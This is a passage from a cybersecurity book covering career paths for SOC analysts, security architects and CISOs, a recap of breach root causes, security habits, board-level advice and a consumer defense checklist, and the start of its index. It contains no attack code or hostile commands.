cybersecurity analyst who can help assess third-party risk can  be an attractive option. Vendors such as BitSight and SecurityScorecard  help produce reports with credit rating–like scores from 250 to 900  similar  to FICO scores  or 0–100 A–F grades, respectively, for an organization’s  external security posture. Such reports can be an initial starting point for  cybersecurity analysts to understand third-party risk and also the basis  for such analysts to work with third-party organizations to improve their  security posture if and as needed.  396   Chapter 16    applying your SkillS to CyberSeCurity  Table 16-2.  Possible Target Cybersecurity Roles Based on Current Role  What Do You Do Today?  Possible Target Cybersecurity Roles  it System administrator network engineer  Software Developer engineer Systems engineer  Cybersecurity analyst information Security analyst SoC analyst penetration tester Cybersecurity Specialist technician  Cybersecurity engineer Software Security engineer application Security engineer product Security engineer  Quality assurance tester  Software architect, network  architect  Vulnerability analyst penetration tester  Security architect  it engineer  Corporate Security engineer  Financial or information  technology auditor  Cybersecurity auditor or Consultant  internal or  external , Chair of audit Committee  project Manager  product Manager  Manager, Director, Vp of  Security  Security project Manager  Security product Manager  CiSo, CSo, Chair of audit Committee  For those of you who are software engineers, we would highly   encourage you to pursue security software engineer, application security  engineer, and product security engineer positions once you complement  your software background with security training. As a  software developer,  the industry needs you to build new products and services that are secure   397   Chapter 16    applying your SkillS to CyberSeCurity  from the ground-up. It is much simpler to design security into the products  rather than treat them as an afterthought.  Security project managers are needed to assist information security   teams in driving forward projects that harden security posture by  collaborating with IT teams, human resources, engineering, and other  organizations. There can be many interdependencies in rolling out  endpoint protection tools, advanced multi-factor authentication,  deploying SPF DKIM DMARC, and many other technologies that we  discussed in Chapters 12 and 13.   For instance, to have all outbound emails digitally signed using   DKIM to prevent phishing, project managers typically need to coordinate  with many both internal and external groups that send emails on the  organization’s behalf, and IT teams need to provide those email servers  with a private key only known to the organization. Secure storage of such  keys and also operational testing are necessary. Then, to actually have  malicious emails that are being sent around the Internet claiming to be  from the legitimate organization rejected, DMARC settings need to be  incrementally increased from 0% of email traffic to 100%. Inevitably, some  party that sends emails on the organization’s behalf gets missed, and  legitimate emails start getting dropped as the DMARC settings are rolled  out. Project managers who are used to dealing with interdependencies and  who also develop an understanding of security will be well positioned to  help with such complex rollouts.  The first career path that we will cover in detail is that of a SOC Analyst,   which probably makes up the largest fraction of open career positions in  cybersecurity. These jobs had a median pay just shy of $100,000  $99,730  to be exact , and the number of openings was expected to grow 31% over  the ten-year period from 2019 to 2029.  We begin with this role because it’s also a great way to enter the field,   learn, and grow. A SOC analyst gets exposed to the other subdomains  in security and allows for smoother transitions into more senior or  “specialists” roles. That said, SOC Analyst jobs are also most likely to be   398   Chapter 16    applying your SkillS to CyberSeCurity  automated away by technology, so we will cover how you can get a position  in the field as a SOC Analyst and what you need to do to stay in the field  and advance in it, given increasing automation efforts.   SOC Analyst A SOC analyst helps with triaging and addressing security alerts from a  variety of self-reporting or detection systems, responding to incidents, and  hunting for threats. SOC analyst roles typically have levels associated with  them—level 1 for entry-level roles and up to level 3 or 4 for the most senior  SOC analyst or manager roles. Table 16-3 shows some example mitigations  that level 1 SOC analysts help conduct to fight the root causes of breach.  Table 16-3.  Examples of How SOC Analysts Mitigate   Root Causes of Breach  Example Reactive Mitigations That SOC Analysts Conduct  Root Cause of  Breach  phishing  Malware  reset stolen credentials after phishing attack is reported. investigate abuse of stolen credentials. request adjustments be made on email filtering systems.  Cut off infected machine from network. Quarantine malware. reimage if needed. engage Corp it desktop engineering to root cause why machine  got infected and resolve to prevent future cases.  Software  vulnerabilities  Facilitate coordinate patching. analyze severity of vulnerabilities in context. Monitor machine and software service health post patching.  unencrypted data help teams encrypt the data using an appropriate tool.  third-party risk  analyze third-party risk posture and help with remediation plan. respond to third-party alerts and escalations.  399   Chapter 16    applying your SkillS to CyberSeCurity  For instance, in the case that an employee self-reports that they may  have fallen susceptible to a phishing attack and entered their credentials  in an impostor website, a level 1 SOC analyst can  1  request that the IAM  team immediately reset the stolen credentials,  2  determine the exact  time that the employee may have visited the impostor website and entered  their credentials by looking at web proxy logs, and  3  determine if the  employee’s credentials were used by anyone but the employee from the  time that the credentials were stolen to the time that the credentials were  reset. If based on the results of step 3, there was no anomalous usage of  the employee’s account, the incident can be closed. However, if there was  some anomalous usage of the employee’s account  e.g., the attacker logged  in to the user’s email, sent emails to others to phish them or infect them  with malware, etc. , then additional remediations may be required until all  traceable attacker activity has been contained, and any footprint that the  attacker may have gained in terms of additional accounts or compromised  machines can be eliminated.  Most of the security events that SOC analysts investigate may come   from a SIEM  security incident and event management  system, such  as Splunk. Data from many detection systems including anti-malware  systems, authentication logs, and logs from ideally every system or machine  that an organization uses can be fed into a SIEM. If not properly tuned,  a SIEM can generate lots of false positive alerts. SOC analyst time can  often be wasted on such alerts, and good SOC analysts who have some  programming experience can help fine-tune such alerts to be more high  fidelity, thereby not only making better use of their own time but helping  make more effective use of the time of other SOC analysts as well.  Becoming a SOC analyst can be a great first step toward a career  in cybersecurity. To become a SOC analyst, it is extremely important  to understand how attacks are carried out because one of the key  responsibilities of a SOC analyst is to interrupt attacks as early as possible  in the attacker lifecycle. As such, developing an understanding of tools  such as Metasploit which allow both penetration testers and attackers   400   Chapter 16    applying your SkillS to CyberSeCurity  to scan for vulnerabilities, compromise hosts, take control of  or “own”   them, and then continue scanning again to grow footprint will allow  an analyst to go beyond just triaging attacks and helping with incident  response. More senior SOC analysts  level 2 or 3  can help proactively hunt  for threats and vulnerabilities instead of just helping an organization react  to attacks. Proactive hunting and remediation of issues found can help cut  off attack paths that real attackers can try, and closing each such path off  can help “harden” an organization against attack.  In addition to learning about tools such as Metasploit, we would   encourage SOC analysts to learn about scripting and automation. Because  there are so many unfilled SOC analyst job openings, CISOs are going to be  forced to invest in automation as they will not be able to fill all SOC analyst  job openings. Once automated, the CISOs’ expenses will also go down  as it will not be necessary to hire humans to handle jobs that have been  automated. The best way to have job security as a SOC analyst is to develop  the skills that help automate the triage and remediation of incidents. Over  the past few years, SOAR technology  security orchestration, automation,  and response  has been used to automate common incident response  tasks, through the development of automated “playbooks” that can  execute the required tasks. Such playbooks and scripts can be written in  programming languages like Python or can sometimes also be built using  visual programming languages.   Security Architect Security architects are among the most senior technical roles in the  cybersecurity field. We would recommend that every CISO always keep  a security architect as one of their right hands. Security architects can  help design and build systems that are both internal to a company that  proactively protect it from the root causes of breach and that also help  protect external software services and products that the company offers.   401   Chapter 16    applying your SkillS to CyberSeCurity  As such, security architects can have roles on both a corporate security  engineering team and a product application security engineering team. To become a security architect, we would first recommend that you   become a good developer, engineer, or programmer first. You should have  a background in IT, software engineering, and computer science and years  of experience building systems. As an architect, you may have to do much  of your work through influence, and soft skills are very important to get  things done in an environment in which you do not have direct authority  over the many teams that you need to work with to achieve your security  objectives.  If you have a background as a software architect, but want to become a   security architect, following are some key steps that you can take:     Learn about different types of software security   vulnerabilities  buffer overflows, code injection, cross-  site attacks, etc.  and defenses  input validation, output  escaping, cryptography .     Find some zero-day vulnerabilities in open source   projects. Get credited for CVEs vulnerabilities that you  submit to the National Vulnerability Database.     Learn about Secure Design. The IEEE Center for Secure   Design  CSD  has some great resources to do so  e.g.,  IEEE CSD Top 10 Design Flaws4 .     Design and implement or deploy a framework that   will defend against an entire class of implementation  vulnerabilities  e.g., input validation library, auto-  escaping to prevent XSS .  4 https:  ieeecs-media.computer.org media technical-activities CYBSI  docs Top-10-Flaws.pdf  402   Chapter 16    applying your SkillS to CyberSeCurity     Develop soft skills to diplomatically engage developers   to help them design their code securely as well as fix  identified vulnerabilities.  Table 16-4 provides some examples of how security architects mitigate  the root causes of breach. We recommend you consult Chapters 12 and 13  for an overview of the technologies in the table. Security architects develop  a deep understanding of many of those technologies and the trade-offs  between them.  Table 16-4.

As such, we will provide  a few guidelines on developing some domain expertise along with some  breadth, collaboration skills, and explaining capability.  403   Chapter 16    applying your SkillS to CyberSeCurity   Domain Expertise  To become a CISO, we would encourage one to develop two to four  domain “spikes” in sub-areas of information security, in addition to being  a well-rounded leader. Some of the most admirable leaders have done the  jobs of people that work for them in the past and have become experts  in some of those jobs. Rotating through various information security  departments can be a valuable experience for those aspiring to be CISOs.  That said, it is typically a good idea to avoid being a jack of all trades and  a master of none. Hence, those aspiring to be a CISO should become a  master in at least a few of the domains of information security so that they  deeply know the battles that their teams fight.  For instance, prior to becoming a CISO myself, I  Neil  became an   expert in anti-malware, web security vulnerabilities, click fraud, and  malicious advertising. Those were my domain spikes that gave me depth  in particular areas. By having deep domain expertise in a few areas, it also  gave me some breadth across a few domains instead of just being a deep  domain expert in one.  However, one cannot be an expert in everything, nor should one try   to be. Instead, a good CISO will complement themselves by hiring leaders  who report to them for areas that they do not have as much expertise in.  The CISO should listen to those leaders and perhaps learn just enough  about those areas to be “fluent” even if the CISO relies on their direct  reports to be the masters of those domains.   Strong Collaboration  Beyond building a depth of domain expertise in two to four areas and  enough breadth to be fluent in all sub-areas of information security,  aspiring CISOs should spend lots of time developing soft skills and  relationships that will help them on the job. Although a CISO may have an  information security team directly reporting to them, the CISO will have   404   Chapter 16    applying your SkillS to CyberSeCurity  to get much accomplished through influence over many other corporate  functions. In my past at Google, I  Neil  had spent some time as a product  manager, in which I had influence, but no direct authority over engineers  on Google’s security team. Learning about product management is a  great thing for aspiring CISOs to do as the skills to work through influence  are a must to make both a cultural and a tactical impact on an entire  organization when they have direct authority only over a small portion.  Because CISOs have to coordinate and get things done by having the   CIO and CTO’s teams actually implement key security controls, it’s vital  that CISOs build the skills of partnership, collaboration, and coordination.  They have to be experts at influencing others. Successful CISOs are able  to get support and move the teams that don’t report directly to them.  Avoiding “do so because I’m the CISO” will help to get the broader  organization behind you.   Chief Explainers and Storytellers  Finally, CISOs should spend time becoming good “explainers” and  storytellers. Steve Jobs, CEO of Apple, once said, “The most powerful  person in the world is the storyteller. The storyteller sets the vision, values,  and agenda of an entire generation that is to come.” Due to the fact that  the cybersecurity field is filled with acronyms and jargon, CISOs need to  have the ability to explain security to a variety of audiences ranging from  the board of directors to the CEO, to all employees at all-hands events, to  consumers, and to the press. Explanations that leverage stories are often  the most powerful as humans can more easily relate to stories than hard  data, technical architecture diagrams, and the subtleties and intricacies of  information security.  On that note, we hope that the histories and stories of breaches in the   first part of this book can help CISOs and all others who are considering  joining the field explain why or why not to do certain things in their  organizations to achieve security. Should we really skip reviewing the   405   Chapter 16    applying your SkillS to CyberSeCurity  security of that new vendor before we sign a contract with them? After all,  we need to move fast. The CEO wants the product that they are helping  us build released by the end of the quarter. The stories of the Target and  JPMorgan Chase breach in which their suppliers, Fazio Mechanical  Services and Simmco Data Systems, got compromised and led to  mega-  breaches could sway the decision perhaps not to rush past the security  review. As the old adage says, haste can make waste.  Should we save a few dollars and put perhaps just a basic anti-virus   package on all company laptops instead of springing for the dollars for an  advanced anti-malware defense that can perhaps better protect us against  APTs from a nation-state? We’re just a relatively small organization with  relatively little PII. Although the stories of OPM, Yahoo, and Marriott tell  us that nation-states are targeting large organizations that have user data,  it turns out almost every organization is getting targeted by ransomware.  WannaCry, launched by the North Koreans in 2017, infected over 200,000  machines across the world including those at hospitals and universities. Do we really have to patch that critical vulnerability in our product   before we release it? Can’t we just do it a couple weeks after launch?  Will anyone really notice that we haven’t patched some third-party,  open source software that is not a critical system? If we have anything to  learn from data breaches at Facebook and Equifax, it is that nation-state  attackers will notice. Significant research had to be done on Facebook’s  “View Profile As…” feature to identify that three distinct software  vulnerabilities, each not as significant on their own, could come together  to breach the access tokens of tens of millions of Facebook users. Similarly,  Chinese hackers leveraged a third-party Apache Struts vulnerability on  Equifax’s servers to eventually be able to laterally move within Equifax’s  network to capture PII of over half the American population in the largest  financial identity breach at the time of writing of this book.  406   Chapter 16    applying your SkillS to CyberSeCurity  It is often said, “Those who do not learn history are doomed to repeat   it.”5 Hopefully, the stories and lessons of the past can help us avoid  repeating the same mistakes of the past. The root causes of breach over the  past several years have been fairly consistent, and time will tell if we have  learned from them. Someone6 once said, “The past does not repeat itself,  but it rhymes.” Even when attackers evolve their techniques, it is likely that  there will be similarities between attacks of the future and breaches of the  past. To that end, we hope that those of you who are aspiring CISOs will be  able to tell the stories and histories of breaches in the first part of this book  and leverage the advice in the second part of this book to avoid having  breaches based on the same root causes repeat in their organizations.   Summary There is much opportunity to enter and advance in the cybersecurity  field, given the number of job openings and demand for cybersecurity  professionals. There are many different types of roles available  not all  deeply technical , and in this chapter we have provided some guidance to  develop career paths for three such roles  SOC Analyst, Security Architect,  and CISO .  5 Attributed to George Santayana, although his original quote may have read  “Those who do not remember the past are condemned to repeat it.” 6 This quote has often been attributed to Mark Twain, but it is unclear where it  originated.  407   CHAPTER 17  Recap  In Part 1, we covered the histories and stories of big breaches and the root  causes of thousands of breaches from 2003 to 2020. Table 17-1 summarizes  the root causes of the data breaches at Target, JPMorgan Chase, Yahoo,  OPM, Facebook, Marriott, and Capital One. Phishing, for instance, was a  root cause of breach in the Target, JPMorgan Chase, and Yahoo breaches.  Malware was a root cause in the Target, Yahoo, OPM, and Marriott  breaches. Software vulnerabilities were root causes in breaches at Yahoo,  Facebook, and Capital One.  Although phishing and malware have been around since almost   the 1980s, third-party compromise started appearing as a prevalent key  cause in 2013 and 2014 with the Target and JPMorgan Chase breaches  and in other hacks thereafter such as SolarWinds. Unencrypted data  has been a cause of many small- and medium-sized breaches since the  birth of the age of computing. However, statistics on it started becoming  publicly available after California passed its landmark data breach  notification law in 2003, and then other states followed with similar  laws. Today, compliance standards such as GDPR and CCPA will force  organizations to not only report breaches of privacy internationally  but also allow governments to impose significant penalties. Finally,  inadvertent employee mistakes  aside from phishing  have also been a  significant cause of breaches. For instance, in the Capital One breach, a  web application firewall misconfiguration made by an employee may have  been in part responsible for the breach.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_17  409   ChaPTEr 17    rECaP  Table 17-1.

As with many things in life,  accomplishing goals such as security often starts with the right habits.  Chapter 9 covered the key habits that organizations need to adopt to  achieve security, and those habits are summarized in Table 17-2. Such  habits need to be worked into the culture and DNA of organizations. The  larger the organization, the more work may be required to instill such  habits.  410   Table 17-2.  The Seven Habits of Highly Effective Security  ChaPTEr 17    rECaP  habit 1. Be proactive, prepared, and paranoid.  habit 2. Be mission-centric.  habit 3. Build security and privacy in.  habit 5. Measure security.  habit 6. automate everything.  habit 7. Embrace continuous improvement.  habit 4. Focus on security first; achieve compliance as a side effect.  Starting with the right habits, one can then start at the board level of   an organization to work to achieve security, as covered in Chapter 10.   Table 17-3 summarizes five key pieces of advice that can be used for  board- level discussions on cybersecurity.  Table 17-3.  Advice for Board-Level Discussions on Cybersecurity      1.  Focus on existential security risks first.     2.   Lead with CarE: are security controls consistent, adequate, reasonable, and   effective?      3.  Tell the board a cohesive story, and only then back up the story with metrics.     4.  Connect the dots between security initiatives and business outcomes.     5.  report on security events calmly.  With the meta-level root causes of breach addressed at the board  and leadership level as discussed in Chapters 10 and 11, the next step  is to tactically focus on technology and process countermeasures that  can defend an organization from breach. Examples of such defenses are  covered in Chapters 12 and 13 are summarized in Table 17-4.  411   ChaPTEr 17    rECaP  Table 17-4.

In Chapter 14, we analyzed the approximately 4,000  cybersecurity companies in which funds have been invested. Although  just a few areas of cybersecurity have been overinvested or sufficiently  invested, as per hypotheses developed in Chapter 14, many more areas of  cybersecurity are ripe for further investment, as shown in Table 17-5. Even  for areas that are potentially overinvested or sufficiently invested, further  investment could still help, but the quality bar for such investments will  probably need to be higher than otherwise.  413   ChaPTEr 17    rECaP  Table 17-5.  Cybersecurity Investment Hypotheses  Overinvested  Sufficiently Invested Underinvested  Blockchain Cryptocurrencies  Cloud security,   Mobile security  artificial intelligence for security Security for artificial intelligence Security analytics Privacy Fraud detection Internet of Things  IoT  security risk management Penetration testing and consulting Compliance  Consumers are susceptible to getting breached by many of the same   root causes that impact organizations and enterprises, and Chapter 15  focused on providing guidance to consumers on how they can avoid  root causes of breach. The Consumer Defense Checklist in Table 17-6  summarizes eight steps that consumers can take to protect themselves.  Table 17-6.  Consumer Defense Checklist  Enable two-factor authentication for every online account that offers it.  Use a password manager.  Sign up for identity protection. Ensure the identity protection service also  includes stolen funds reimbursement  and not just a service guarantee .  Secure your router. Change the default password. Patch it regularly. Get a  new router if it cannot be updated. Enable your firewall. Enable parental  controls for kids.  Download and install an anti-malware package on all your endpoint  devices, including mobile and tablets.   continued   ✓ ✓ ✓  ✓  ✓  414   ChaPTEr 17    rECaP  Table 17-6.   continued   ✓  ✓  ✓  Enable storage encryption on all your devices. Enable BitLocker, enable  FileVault, and choose a PIN on all mobile devices  which usually enables  encryption on the device .  Use cloud backup. Test doing file restores so you know the service is  configured properly.  regularly update patch all your devices.  Cybersecurity is a great field to get into, with hundreds of thousands  of jobs available in the United States as of 2021 and millions of open jobs  worldwide. You do not have to be a technical genius or master hacker  to get into the field. You can leverage your existing skills to help you get  into the field and seek additional training to give you enough domain  knowledge to enter the field. In Chapter 16, we described the structure  of a typical information security team in a medium-sized company and  provided guidance for how, based on what you do today, you can target  roles in information security.  The mission of cybersecurity is an important and deeply needed one.   We hope that we have provided a useful introduction to the field, both  through discovering what can be learned from big breaches and guidance  for those looking to make a difference whether you are an employee  in a nonsecurity-related role, a consumer, a security or technology  professional, a CEO, a board member, or an investor. If big breaches are  any indication, there is much work to be done ahead of us, and we are only  at the beginning of the path to recovery. We hope that you will use this  book as just a starting point in your exploration of cybersecurity and help  us secure the world for the generations to come.  415   Index  A Account Management   Tool  AMT , 165  Acquisition, 57, 58 Adjudication information, 5 Advanced persistent    threat  APT , 135 Amazon S3 Breaches, 29 Amazon Web Services  AWS , 42 Anti-bot detection, 290 Anti-malware protection, 149 Anti-phishing training, 292 Apache Struts, 78, 79  end-of-life McAfee vulnerability   scanner, 80, 81  security vulnerabilities, 81, 82 vulnerabilities, 79  Artificial intelligence  AI , 338, 345 Attack  bucket breach, 50, 51 EC2 to SSRF, 47, 48 incident timeline    aftermath, 51, 52 metadata service, 49 stolen security credentials, 49 system layout, 45, 46 WAF role, 46  Authorizations to    Operate  ATO , 136  Automated Consumer Interview   System  ACIS , 75  Autonomous mobile robots    AMRs , 211  B Be Mission-Centric  activities, 209 organization’s mission, 208 risks  advantages,    opportunities, 210  fulfilling obligations, 210 sales enablement, 211  security, 212, 213  Be Proactive, Prepared, and   Paranoid  communications tools and   process, 205  cybercriminals, 206–208 cyber insurance, 205 example, 198 forensics firms engaged, 204 hackers, 198 incident response strategy, 203    Neil Daswani and Moudy Elbayadi 2021  N.
